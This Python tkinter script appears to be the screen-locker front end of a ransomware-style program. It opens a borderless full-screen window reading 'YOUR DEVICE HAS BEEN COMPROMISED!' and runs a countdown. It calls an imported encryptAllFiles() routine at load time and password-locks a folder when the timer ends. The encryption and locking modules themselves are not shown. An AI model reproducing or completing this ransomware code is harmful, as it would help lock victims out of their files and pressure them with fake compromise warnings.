import time
from tkinter import *
from tkinter import messagebox
import encrypt
import zip2
import os
import pyminizip
from PIL import Image, ImageTk

from pathlib import Path

from screeninfo import get_monitors
for m in get_monitors():
    a=str(m).split(', ')
    print(a)
tempWidth=a[2].split("=")
tempHeight=a[3].split("=")

geometry=tempWidth[1]+"x"+tempHeight[1]
root = Tk()
root.overrideredirect(True)

root.geometry(geometry)

root.title("Time Counter")


hour=StringVar()
minute=StringVar()
second=StringVar()

# setting the default value as 0
hour.set("00")
minute.set("00")
second.set("05")

# Use of Entry class to take input from the user
hourEntry= Entry(root, width=3, font=("Arial",45,""),justify=CENTER,
				textvariable=hour)
hourEntry.place(relx=0.4,rely=0.5,anchor=CENTER)

minuteEntry= Entry(root, width=3, font=("Arial",45,""),justify=CENTER,
				textvariable=minute)
minuteEntry.place(relx=0.5,rely=0.5,anchor=CENTER)

secondEntry= Entry(root, width=3, font=("Arial",45,""),justify=CENTER,
				textvariable=second)
secondEntry.place(relx=0.6,rely=0.5,anchor=CENTER)

title = Label(root,text="YOUR DEVICE HAS BEEN COMPROMISED!", font = ("Arial",40,'bold'), fg = "red", justify = 'center')
title.grid(padx=410,pady=300)


image = Image.open("icon.jpg")
resized_image = image.resize((300,250))
photo = ImageTk.PhotoImage(resized_image)
label = Label(root,image=photo)
#label.grid(row=4,column=0)
label.place(x=1380,y=400)

photo2 = ImageTk.PhotoImage(resized_image)
label2 = Label(root,image=photo2)
#label.grid(row=4,column=0)
label2.place(x=250,y=400)


def progress_handler(fileName, percent):
	
	print(f"{fileName} : {percent}%")

def submit():
	try:
		
		temp = int(hour.get())*3600 + int(minute.get())*60 + int(second.get())
		
	except:
		print("Please input the right value")
	#print(temp)
	while temp >-1:
		
		# divmod(firstvalue = temp//60, secondvalue = temp%60)
		mins,secs = divmod(temp,60)

		hours=0
		if mins >60:
			
			hours, mins = divmod(mins, 60)
		
		hour.set("{0:2d}".format(hours))
		minute.set("{0:2d}".format(mins))
		second.set("{0:2d}".format(secs))


		root.update()
		time.sleep(1)


		if (temp == 0):
			
			zip2.passwordLockTheFolder()
			root.withdraw()
			messagebox.showinfo("Alert","Your folder has been locked.")
			root.destroy()
		
		temp -= 1

encrypt.encryptAllFiles()

def main():
			submit()

			root.mainloop()
			

if __name__ == '__main__':
   main()
